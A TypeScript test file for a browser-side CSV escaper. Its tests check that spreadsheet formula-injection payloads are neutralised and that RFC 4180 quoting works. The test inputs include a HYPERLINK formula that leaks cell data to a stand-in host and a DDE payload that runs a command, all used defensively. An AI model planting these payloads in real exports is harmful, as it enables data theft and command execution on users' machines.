/**
 * csvEscape — the CLIENT-side CSV cell writer.
 * ===========================================
 *
 * This file exists because the backend CSV audit (§21) consolidated four
 * server-side quoters into `backend/utils/csvEscape.mjs`, while the client was
 * never audited. An independent sweep of `frontend/src` found ELEVEN browser-side
 * CSV exports — eight with a private escaper, two inline, and one that did not
 * escape at all:
 *
 *   Admin/SessionAllocationManager.logic.ts            escapeCsvCell
 *   Admin/TrainerPermissionsManager.logic.ts           escapeCsvCell
 *   Admin/SMSLogsPanel.tsx                             inline, always-quoted
 *   DashBoard/progress-proof/progressChartActions.ts   csvEscape
 *   TrainerDashboard/.../trainerClientReportExport.ts  csvCell
 *   .../admin-exercises/components/ExerciseLibraryManager.tsx   escapeCsvValue
 *   .../admin-exercises/components/ExerciseStatsPanel.tsx       escapeCsvValue
 *   .../admin-exercises/hooks/useExerciseStats.ts      NO escaping at all
 *   .../admin-sessions/AdminSessionsSessionList.logic.ts        csvCell
 *   .../admin-clients/EnhancedAdminClientManagementView.tsx     inline, no doubling
 *   UniversalMasterSchedule/hooks/useBusinessIntelligence.ts    escapeBusinessReportValue
 *
 * Every one of the eight helpers was a CORRECT RFC 4180 quoter, and every one of
 * them leaked a live formula, because escaping for STRUCTURE does nothing for
 * INTERPRETATION. These tests pin both halves so neither can regress silently.
 */
import { describe, expect, it } from 'vitest';
import {
  CSV_FORMULA_TRIGGER,
  CSV_NEEDS_QUOTING,
  escapeCsvValue,
  serializeCsv,
} from './csvEscape';

/** The payloads every one of the eleven sites used to pass through untouched. */
const HOSTILE_PAYLOADS = [
  '=1+1',
  '=HYPERLINK("https://evil.example?d="&A1,"View invoice")',
  "=cmd|'/c calc'!A0",
  '+1',
  '-1',
  '@SUM(A1)',
  ' =1+1',
] as const;

/**
 * Decode one CSV cell back to its value: strip the RFC 4180 quoting, then undo
 * the quote doubling. Used to assert the escaper is LOSSLESS — a neutraliser that
 * also mangled the payload would be its own defect.
 */
const unquoteCsvCell = (cell: string): string => {
  if (cell.length < 2 || !cell.startsWith('"') || !cell.endsWith('"')) return cell;
  return cell.slice(1, -1).replace(/""/g, '"');
};

describe('escapeCsvValue — interpretation (formula neutralisation)', () => {
  it.each(HOSTILE_PAYLOADS)('neutralises %j without corrupting it', (payload) => {
    const decoded = unquoteCsvCell(escapeCsvValue(payload));

    // The apostrophe must be the FIRST character of the value, otherwise the
    // spreadsheet still sees the trigger in leading position and runs it.
    expect(decoded.startsWith("'")).toBe(true);

    // Round-trip: behind the neutraliser the payload must survive byte-for-byte.
    // Comparing the DECODED cell (not the raw cell) is what makes this correct for
    // payloads that contain `"` — those get quoted and their quotes doubled, so the
    // raw cell legitimately no longer contains the payload as a substring.
    expect(decoded.slice(1)).toBe(payload);
  });

  it('treats a leading space as live, because spreadsheets trim before deciding', () => {
    // This is finding D6 on the backend side. ` =1+1` contains no character that
    // forces quoting, so a perfect RFC 4180 quoter passes it through untouched.
    expect(escapeCsvValue(' =1+1')).toBe("' =1+1");
  });

  it('neutralises a leading tab and a leading CR', () => {
    expect(escapeCsvValue('\t=1+1')).toBe("'\t=1+1");
    expect(escapeCsvValue('\r=1+1')).toBe('"\'\r=1+1"');
  });

  it('does NOT formula-prefix a real number, so numeric columns survive', () => {
    // -5 is a legitimate number. Turning it into '-5 would corrupt the column.
    expect(escapeCsvValue(-5)).toBe('-5');
    expect(escapeCsvValue(-1.25)).toBe('-1.25');
    expect(escapeCsvValue(0)).toBe('0');
  });

  it('DOES neutralise a numeric-looking STRING, because it came from user input', () => {
    expect(escapeCsvValue('-5')).toBe("'-5");
  });

  it('control — an ordinary value is left completely untouched', () => {
    // Guards against the over-correction: neutralising everything would be as
    // wrong as neutralising nothing, and would corrupt every numeric column.
    expect(escapeCsvValue('Jackie Smith')).toBe('Jackie Smith');
    expect(escapeCsvValue(42)).toBe('42');
    expect(escapeCsvValue(true)).toBe('true');
  });
});

describe('escapeCsvValue — structure (RFC 4180 quoting)', () => {
  it('quotes and doubles an embedded double quote', () => {
    expect(escapeCsvValue('a"b')).toBe('"a""b"');
  });

  it('quotes a value containing a comma so columns do not shift', () => {
    expect(escapeCsvValue('Smith, Jackie')).toBe('"Smith, Jackie"');
  });

  it('quotes a value containing a newline so rows do not split', () => {
    expect(escapeCsvValue('line1\nline2')).toBe('"line1\nline2"');
  });

  it('quotes a value containing a CR', () => {
    expect(escapeCsvValue('a\rb')).toBe('"a\rb"');
  });

  it('renders null and undefined as an empty cell', () => {
    expect(escapeCsvValue(null)).toBe('');
    expect(escapeCsvValue(undefined)).toBe('');
  });

  it('does not quote a value that needs neither escaping nor neutralising', () => {
    expect(escapeCsvValue('plain')).toBe('plain');
  });
});

describe('the two exported character classes stay in sync with the implementation', () => {
  it('CSV_FORMULA_TRIGGER matches every hostile payload', () => {
    for (const payload of HOSTILE_PAYLOADS) {
      expect(CSV_FORMULA_TRIGGER.test(payload), `trigger missed ${payload}`).toBe(true);
    }
  });

  it('CSV_FORMULA_TRIGGER does not match an ordinary name', () => {
    expect(CSV_FORMULA_TRIGGER.test('Jackie Smith')).toBe(false);
    expect(CSV_FORMULA_TRIGGER.test('a-b')).toBe(false);
  });

  it('CSV_NEEDS_QUOTING matches exactly the RFC 4180 quoting characters', () => {
    expect(CSV_NEEDS_QUOTING.test('a,b')).toBe(true);
    expect(CSV_NEEDS_QUOTING.test('a"b')).toBe(true);
    expect(CSV_NEEDS_QUOTING.test('a\nb')).toBe(true);
    expect(CSV_NEEDS_QUOTING.test('a\rb')).toBe(true);
    expect(CSV_NEEDS_QUOTING.test('plain')).toBe(false);
  });
});

describe('serializeCsv', () => {
  it('joins rows with CRLF per RFC 4180 §2.1', () => {
    expect(serializeCsv(['a', 'b'], [['1', '2']])).toBe('a,b\r\n1,2');
  });

  it('escapes headers and cells through the same single implementation', () => {
    expect(serializeCsv(['Name'], [['a"b']])).toBe('Name\r\n"a""b"');
  });

  it('neutralises a formula in a data cell', () => {
    expect(serializeCsv(['Name'], [['=1+1']])).toBe("Name\r\n'=1+1");
  });
});
